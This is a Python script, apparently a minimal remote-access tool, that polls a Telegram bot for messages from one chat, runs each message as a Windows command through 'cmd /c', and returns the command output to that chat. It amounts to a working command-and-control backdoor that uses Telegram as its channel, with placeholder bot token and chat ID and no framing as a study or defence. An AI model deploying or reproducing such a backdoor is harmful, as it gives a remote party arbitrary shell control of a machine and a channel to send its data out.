
import requests as req
import time
import subprocess

TOKEN = "bot_token"
ID = "chat_id"
URL = f"https://api.telegram.org/bot{TOKEN}"

offset = 0
P=True

r = req.get(f"{URL}/getUpdates", timeout=10)
data = r.json()
 
if data.get("ok") and data["result"]:
    offset = data["result"][-1]["update_id"] + 1

print("Starting from offset:", offset)

session = req.Session()

print("Bot is running... Press Ctrl+C to stop.")
session.post(f"{URL}/sendMessage", json={"chat_id": ID, "text": "Bot started..."}, timeout=5)

while P:
    try:
        r = session.get(
            f"{URL}/getUpdates",
            params={
                "offset": offset,
                "timeout": 30,
                "allowed_updates": ["message"]
            },
            timeout=40
        )

        r.raise_for_status()
        data = r.json()

        if not data.get("ok"):
            print("Telegram API error:", data)
            time.sleep(3)
            continue

        for update in data.get("result", []):

            offset = update["update_id"] + 1

            try:
                message = update.get("message")

                if not message:
                    continue

                chat_id = str(message.get("chat", {}).get("id"))

                if chat_id != ID:
                    continue

                text = message.get("text", "").strip()

                print("Received:", text)

                if text == 'exit':
                    P = False
                    
             
                result = subprocess.run(
                        'cmd /c '+text,
                        capture_output=True,
                        text=True,
                        timeout=15
                    )

                output = result.stdout + result.stderr

                if not output.strip():
                    output = "No output returned."

                response = session.post(
                    f"{URL}/sendMessage",
                    json={
                        "chat_id": ID,
                        "text": output[:4000]
                    },
                    timeout=20
                )

                print("SEND:", response.status_code)

                response.raise_for_status()

            except subprocess.TimeoutExpired:
                print("Command timeout.")

            except Exception as e:
                print("Update error:", repr(e))

    except KeyboardInterrupt:
        print("\nBot stopped.")
        session.post(
            f"{URL}/sendMessage",
            json={
                "chat_id": ID,
                "text": "Bot stopped..."
            },
            timeout=5
        )
        break

    except req.exceptions.RequestException as e:
        print("Connection error:", repr(e))
        time.sleep(5)

    except Exception as e:
        print("Main loop error:", repr(e))
        time.sleep(3)
